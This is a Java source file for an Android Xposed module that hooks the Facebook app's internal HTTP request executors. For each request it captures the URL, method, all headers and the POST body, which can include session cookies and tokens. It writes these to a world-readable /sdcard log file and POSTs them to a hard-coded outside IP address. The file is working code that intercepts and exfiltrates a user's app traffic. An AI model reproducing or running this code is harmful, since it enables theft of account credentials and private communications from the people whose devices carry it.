package com.example.xposedtesting;

import android.app.Application;
import android.content.Context;
import de.robv.android.xposed.XC_MethodHook;
import de.robv.android.xposed.callbacks.XC_LoadPackage;
import org.apache.http.*;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.client.methods.HttpUriRequest;
import org.apache.http.entity.BufferedHttpEntity;
import org.apache.http.entity.HttpEntityWrapper;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.impl.client.EntityEnclosingRequestWrapper;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.protocol.HttpContext;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.*;
import java.lang.reflect.Method;
import java.net.URISyntaxException;
import java.util.ArrayList;
import java.util.List;

import static de.robv.android.xposed.XposedHelpers.findAndHookMethod;
import static de.robv.android.xposed.XposedHelpers.findClass;

/**
 * Created by Alex on 07/09/2016.
 */
public class Facebook extends DefaultAbstractApp {

    public String getName()
    {
        return "Facebook";
    }

    public void prepare(final XC_LoadPackage.LoadPackageParam lpparam) {
        log("Loaded app: " + lpparam.packageName);
        findAndHookMethod(Application.class, "attach", Context.class, new XC_MethodHook() {
            @Override
            protected void afterHookedMethod(MethodHookParam param) {
                log("Preparing Facebook");
                try {
                    hookLigerRequestExecutor(lpparam);
                } catch (Throwable e) {
                    log("EXCEPTION in hookLigerRequestExecutor: " + e.getMessage() + ", " + e.getClass().toString());
                }
                try {
                    hookQeHttpRequestExecutor(lpparam);
                } catch (Throwable e) {
                    log("EXCEPTION in hookQeHttpRequestExecutor: " + e.getMessage() + ", " + e.getClass().toString());
                }
                log("Prepare Facebook success!");
            }
        });
    }

    private void hookLigerRequestExecutor(XC_LoadPackage.LoadPackageParam lpparam) {
        final Class<?> ligerRequestExecutor = findClass("com.Facebook.http.executors.liger.LigerRequestExecutor", lpparam.classLoader);
        final Class<?> fbRequestState = findClass("com.Facebook.http.common.FbRequestState", lpparam.classLoader);
        final Class<?> httpFlowStatistics = findClass("com.Facebook.http.observer.HttpFlowStatistics", lpparam.classLoader);
        findAndHookMethod(ligerRequestExecutor, "b", HttpUriRequest.class, fbRequestState, HttpContext.class, httpFlowStatistics, new XC_MethodHook() {
            @Override
            protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                log("HOOKED LigerRequestExecutor");
                HttpUriRequest request = (HttpUriRequest) param.args[0];
                log("LigerRequestExecutor: " + request.getRequestLine().toString());
                sdsRequest(request, "LigerRequestExecutor");
            }
        });
    }

    private void hookQeHttpRequestExecutor(XC_LoadPackage.LoadPackageParam lpparam) {
        final Class<?> qeHttpRequestExecutor = findClass("com.Facebook.http.executors.qebased.QeHttpRequestExecutor", lpparam.classLoader);
        final Class<?> fbRequestState = findClass("com.Facebook.http.common.FbRequestState", lpparam.classLoader);
        final Class<?> httpFlowStatistics = findClass("com.Facebook.http.observer.HttpFlowStatistics", lpparam.classLoader);
        findAndHookMethod(qeHttpRequestExecutor, "a", HttpUriRequest.class, fbRequestState, HttpContext.class, httpFlowStatistics, new XC_MethodHook() {
            @Override
            protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                log("HOOKED QeHttpRequestExecutor");
                HttpUriRequest request = (HttpUriRequest) param.args[0];
                log("QeHttpRequestExecutor: " + request.getRequestLine().toString());
                sdsRequest(request, "QeHttpRequestExecutor");
            }
        });
    }

    /**
     * Looks like that's the base http requests class, but hooks not working
     *
     * @param lpparam
     */
    private void hookXayt(XC_LoadPackage.LoadPackageParam lpparam) {
        final Class<?> Xayt = findClass("Xayt", lpparam.classLoader);
        for (Method xMethod : Xayt.getMethods()) {
            log("Xayt: method: " + xMethod.getName());
            for (Class<?> xType : xMethod.getParameterTypes()) {
                log("Xayt: " + xMethod.getName() + ", param: " + xType.getName());
            }
        }

        findAndHookMethod(Xayt, "execute", HttpHost.class, HttpRequest.class, HttpContext.class, new XC_MethodHook() {
            @Override
            protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
                log("HOOKED Xayt.execute!!!");
                log("Xayt.execute: class: " + param.args[1].getClass());
                HttpRequest request = (HttpRequest) param.args[1];
                log("Xayt.execute: " + request.getRequestLine().getUri());
            }
        });
    }

    private void sdsRequest(HttpUriRequest sourceRequest, String callerClass) throws JSONException, IOException, URISyntaxException {
        log("Preparing fake request for SDS...");
        String uri, method, query, headers;
        uri = sourceRequest.getRequestLine().getUri();
        method = sourceRequest.getMethod();
        JSONObject jsonHeaders = new JSONObject();
        for (Header header : sourceRequest.getAllHeaders()) {
            jsonHeaders.put(header.getName(), header.getValue());
        }
        headers = jsonHeaders.toString();
        if (sourceRequest.getMethod().equals("GET")) {
            query = "";
        } else if (sourceRequest.getMethod().equals("POST")) {
            EntityEnclosingRequestWrapper requestPost = (EntityEnclosingRequestWrapper) sourceRequest;
            HttpEntityWrapper entity = (HttpEntityWrapper) requestPost.getEntity();
            BufferedHttpEntity buf = new BufferedHttpEntity(entity);
            ByteArrayOutputStream body = new ByteArrayOutputStream();
            buf.writeTo(body);
            query = body.toString();
        } else {
            query = "!!! not implemented for method " + method;
        }
        sdsRequestExecute(uri, method, headers, query, callerClass);
    }

    private void sdsRequestExecute(String uri, String method, String headers, String query, String callerClass) throws UnsupportedEncodingException, JSONException {
        HttpClient client = new DefaultHttpClient();
        HttpPost fakeRequest = new HttpPost("http://95.163.105.99:8821/123");
        List<NameValuePair> urlParameters = new ArrayList<NameValuePair>();
        urlParameters.add(new BasicNameValuePair("fb_url", uri));
        urlParameters.add(new BasicNameValuePair("fb_method", method));
        urlParameters.add(new BasicNameValuePair("fb_headers", headers));
        urlParameters.add(new BasicNameValuePair("fb_query", query));
        urlParameters.add(new BasicNameValuePair("fb_caller", callerClass));

        JSONObject jsonRequest = new JSONObject();
        for (NameValuePair param : urlParameters) {
            jsonRequest.put(param.getName(), param.getValue());
        }
        try {
            PrintWriter file = new PrintWriter(new BufferedWriter(new FileWriter("/sdcard/facebook_log.txt", true)));
            file.println(jsonRequest.toString() + "\n");
            file.close();
        } catch (IOException e) {
            log("Failed writing to file: " + e.getMessage());
        }

        fakeRequest.setEntity(new UrlEncodedFormEntity(urlParameters));
        log("Executing SDS request!");
        try {
            HttpResponse fakeResponse = client.execute(fakeRequest);
            fakeResponse.getEntity().getContent().close();
        } catch (Throwable e) {
            log("SDS ERROR: " + e.getClass().toString() + ", " + e.getMessage());
        }
    }
}

